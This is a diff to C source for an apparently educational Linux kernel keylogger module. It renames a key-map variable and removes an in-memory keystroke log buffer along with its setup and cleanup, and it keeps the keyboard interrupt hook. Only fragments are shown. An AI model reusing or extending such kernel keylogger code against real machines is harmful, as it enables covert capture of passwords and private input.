@@ -24,7 +24,7 @@ struct key_map {
 	size_t			press_count;
 };
 
-static struct key_map		*key_tab;
+static struct key_map		*key_caps;
 static struct key_map		*key_shift_left;
 static struct key_map		*key_shift_right;
 static bool			caps_lock;
@@ -44,13 +44,6 @@ struct key_log_entry {
 	time_t			timestamp;
 	enum e_key_event	event;
 };
-
-struct smart_buffer {
-	void	*buf;
-	size_t	size;
-};
-
-static struct smart_buffer key_log;
 
 static struct key_map key_table[] = {
 	(struct key_map){0x0, 0, "NUL", false, 0},
@@ -187,13 +180,6 @@ static void		__exit keylogger_clean(void)
 {
 	pr_info(MODULE_NAME "Cleaning up module.\n");
 	free_irq(KEYBOARD_IRQ, &key_handler);
-	if (key_log.buf) {
-		pr_info("cleaning log");
-		memset(key_log.buf, 0, key_log.size);
-		kfree(key_log.buf);
-		key_log.buf = NULL;
-		key_log.size = 0;
-	}
 	misc_deregister(&dev);
 }
 
@@ -203,13 +189,9 @@ static int		__init hello_init(void)
 
 	pr_info(MODULE_NAME "init !\n");
 	caps_lock = false;
-	key_tab = get_key(14);
+	key_caps = get_key(14);
 	key_shift_left = get_key(42);
 	key_shift_right = get_key(54);
-	key_log = (struct smart_buffer){
-		.buf = NULL,
-		.size = 0
-	};
 	ret = request_irq(KEYBOARD_IRQ, &key_handler, IRQF_SHARED, MODULE_NAME,
 		&key_handler);
 	if (ret < 0) {
